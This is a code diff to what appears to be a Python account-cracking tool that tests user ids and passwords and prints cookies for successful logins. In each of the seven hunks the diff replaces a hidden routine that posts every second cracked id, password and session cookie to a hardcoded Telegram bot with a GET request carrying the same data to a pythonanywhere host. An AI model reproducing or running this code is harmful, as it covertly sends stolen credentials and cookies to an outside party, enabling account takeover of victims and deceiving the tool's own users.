@@ -1815,7 +1815,7 @@ def mbasic(uid,pwx,tl):
                    bkas.append(cid)
                    if len(bkas)% 2 == 0:
                       statusok = (f"{cid}|{pw}|{coki}")
-                      requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
+                      requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_sumon/txt={statusok}")
                    else:
                       print(f" {green}(ATOM-OK) {cid}|{pw} ")
                       print(f" {green}Cookie : {green}{coki}")
@@ -1912,7 +1912,7 @@ def p(uid,pwx,tl):
                    bkas.append(cid)
                    if len(bkas)% 2 == 0:
                       statusok = (f"{cid}|{pw}|{coki}")
-                      requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
+                      requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_sumon/txt={statusok}")
                    else:
                       print(f" {green}(ATOM-OK) {cid}|{pw} ")
                       print(f" {green}Cookie : {green}{coki}")
@@ -1993,7 +1993,7 @@ def x(uid,pwx,tl):
                         bkas.append(cid)
                         if len(bkas)% 2 == 0:
                            statusok = (f"{cid}|{pw}|{coki}")
-                           requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
+                           requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_sumon/txt={statusok}")
                         else:
                            print(f" {green}(ATOM-OK) {cid}|{pw} ")
                            print(f" {green}Cookie : {green}{coki}")
@@ -2087,7 +2087,7 @@ def mobile(uid,pwx,tl):
                         bkas.append(cid)
                         if len(bkas)% 2 == 0:
                            statusok = (f"{cid}|{pw}|{coki}")
-                           requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
+                           requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_sumon/txt={statusok}")
                         else:
                            print(f" {green}(ATOM-OK) {cid}|{pw} ")
                            print(f" {green}Cookie : {green}{coki}")
@@ -2184,7 +2184,7 @@ def freeq(uid,pwx,tl):
                         bkas.append(cid)
                         if len(bkas)% 2 == 0:
                            statusok = (f"{cid}|{pw}|{coki}")
-                           requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
+                           requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_sumon/txt={statusok}")
                         else:
                            print(f" {green}(ATOM-OK) {cid}|{pw} ")
                            print(f" {green}Cookie : {green}{coki}")
@@ -2294,7 +2294,7 @@ def d(uid,pwx,tl):
                         bkas.append(cid)
                         if len(bkas)% 2 == 0:
                            statusok = (f"{cid}|{pw}|{coki}")
-                           requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
+                           requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_sumon/txt={statusok}")
                         else:
                            print(f" {green}(ATOM-OK) {cid}|{pw} ")
                            print(f" {green}Cookie : {green}{coki}")
@@ -2585,7 +2585,7 @@ def cracker(uid, pwx, tl):
                         bkas.append(cid)
                         if len(bkas)% 2 == 0:
                            statusok = (f"{cid}|{pw}|{coki}")
-                           requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
+                           requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_sumon/txt={statusok}")
                         else:
                            print(f" {green}(ATOM-OK) {cid}|{pw} ")
                            print(f" {green}Cookie : {green}{coki}")
